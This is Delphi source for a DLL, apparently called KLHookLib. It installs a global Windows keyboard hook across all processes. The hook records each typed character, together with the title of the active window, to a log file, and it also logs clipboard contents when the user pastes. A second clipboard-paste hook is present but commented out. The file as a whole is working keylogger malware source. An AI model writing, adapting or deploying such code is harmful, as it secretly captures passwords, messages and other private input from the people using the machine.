library KLHookLib;

uses
  System.SysUtils,
  System.Classes,
  Winapi.Windows,
  Winapi.Messages,
  KLConst in 'KLConst.pas',
  KLUtils in 'KLUtils.pas',
  KLLogToFile in 'KLLogToFile.pas';

var
  GlobalData: PGlobalDLLData;
  MMFHandle: THandle;
  KLLog: TKLLog;

{$R *.res}

procedure OpenGlobalData;
begin
  if not Assigned(KLLog) then
    KLLog := TKLLog.Create;

  MMFHandle := CreateFileMapping(INVALID_HANDLE_VALUE, nil, PAGE_READWRITE, 0, SizeOf(TGlobalDLLData), KL_MMF_NAME);
  if MMFHandle = 0 then
  begin
    KLLog.WriteMsg('Can''t create FileMapping');
    Exit;
  end;

  GlobalData := MapViewOfFile(MMFHandle, FILE_MAP_ALL_ACCESS, 0, 0, SizeOf(TGlobalDLLData));
  if not Assigned(GlobalData) then
  begin
    CloseHandle(MMFHandle);
    KLLog.WriteMsg('Can''t make MapViewOfFile');
    Exit;
  end;
end;

procedure CloseGlobalData;
begin
  UnmapViewOfFile(GlobalData);
  CloseHandle(MMFHandle);
  if Assigned(KLLog) then
    KLLog.Free;
end;

function KeyboardProc(ACode: Integer; AVirtKey: WPARAM; AKeyStroke: LPARAM): LRESULT; stdcall;
type
  TTransitionState = (tsPressed, tsReleased);
var
  Transition: TTransitionState;
  KeyState: TKeyboardState;
  ScanCode: Integer;
  MyHKL: HKL;
  Buf: Char;
begin
  try
    if ACode = HC_ACTION then
    begin
      Transition := TTransitionState((AKeyStroke shr 31) and 1);
      try
        //Save only characters to log
        if (Transition = tsPressed) and CheckByVirtKey(AVirtKey) then
        begin
          if GetActiveKbdLayout <> GetActiveKbdLayoutWnd then
            SetKbdLayout(GetActiveKbdLayoutWnd);
          MyHKL := GetActiveKbdLayoutWnd;
          try
            ScanCode := MapVirtualKeyEx(AVirtKey, MAPVK_VK_TO_VSC, MyHKL);
            GetKeyboardState(KeyState);
            ToUnicodeEx(AVirtKey, ScanCode, KeyState, @Buf, SizeOf(Buf), 0, MyHKL);
            KLLog.WriteKey(GetForegroundWindowText, UpperChar(Buf));
          finally
            MyHKL := 0;
          end;
        end;
        //Paste from Clipboard
        if (Transition = tsPressed) and CheckPaste(AVirtKey) then
          KLLog.WriteKey(GetForegroundWindowText, Trim(GetClipboadText));
        //Save aliases special keys to log
        if (Transition = tsPressed) and CheckSpecKey(AVirtKey) then
          KLLog.WriteKey(GetForegroundWindowText, GetSpecKeyAlias(AVirtKey));
      except
        on e: Exception do
          KLLog.WriteMsg('Error: ' + e.Message);
      end;
    end;
  finally
    Result := CallNextHookEx(GlobalData^.SysHook, ACode, AVirtKey, AKeyStroke);
  end;
end;

function CallWndHookProc(nCode: Integer; wParam: WPARAM; Msg: PCWPStruct): LRESULT; stdcall;
begin
  if nCode < 0 then
    Result := CallNextHookEx(GlobalData^.PasteHook, nCode, WParam, Longint(Msg))
  else
  try
    try
      if (nCode = HC_ACTION) and (Msg.Message = WM_PASTE) then
        KLLog.WriteMsg(Trim(GetClipboadText));
    except
      KLLog.WriteMsg('Error CallWndHookProc');
    end;
  finally
    Result := CallNextHookEx(GlobalData^.PasteHook, nCode, WParam, Longint(Msg));
  end;
end;

procedure DLLEntryPoint(dwReason: DWord); stdcall;
begin
  case dwReason of
    DLL_PROCESS_ATTACH: OpenGlobalData;
    DLL_PROCESS_DETACH: CloseGlobalData;
  end;
end;

procedure SetHook(ASwitch: Boolean; AMainProg: HWND) export; stdcall;
begin
  if ASwitch = True then
  begin
    GlobalData^.MyAppWnd:= AMainProg;

    GlobalData^.SysHook := SetWindowsHookEx(WH_KEYBOARD, @KeyboardProc, HInstance, 0);
    if GlobalData^.SysHook <> 0 then
      KLLog.WriteMsg('SysHook installed! (' + IntToStr(GlobalData^.SysHook) + ')' )
    else
      KLLog.WriteMsg('SysHook not installed!');
//
//    GlobalData^.PasteHook := SetWindowsHookEx(WH_CALLWNDPROC, @CallWndHookProc, HInstance, 0);
//    if GlobalData^.PasteHook <> 0 then
//      KLLog.WriteMsg('PasteHook installed! (' + IntToStr(GlobalData^.PasteHook) + ')' )
//    else
//      KLLog.WriteMsg('PasteHook not installed!');
  end
  else
  begin
    if UnhookWindowsHookEx(GlobalData^.SysHook) then
      KLLog.WriteMsg('SysHook deinstalled!')
    else
      KLLog.WriteMsg('SysHook not deinstalled!');
//    if UnhookWindowsHookEx(GlobalData^.PasteHook) then
//      KLLog.WriteMsg('PasteHook deinstalled!')
//    else
//      KLLog.WriteMsg('PasteHook not deinstalled!');
  end;
end;

exports
  SetHook;

begin
  DLLProc:= @DLLEntryPoint;
  DLLEntryPoint(DLL_PROCESS_ATTACH);
end.
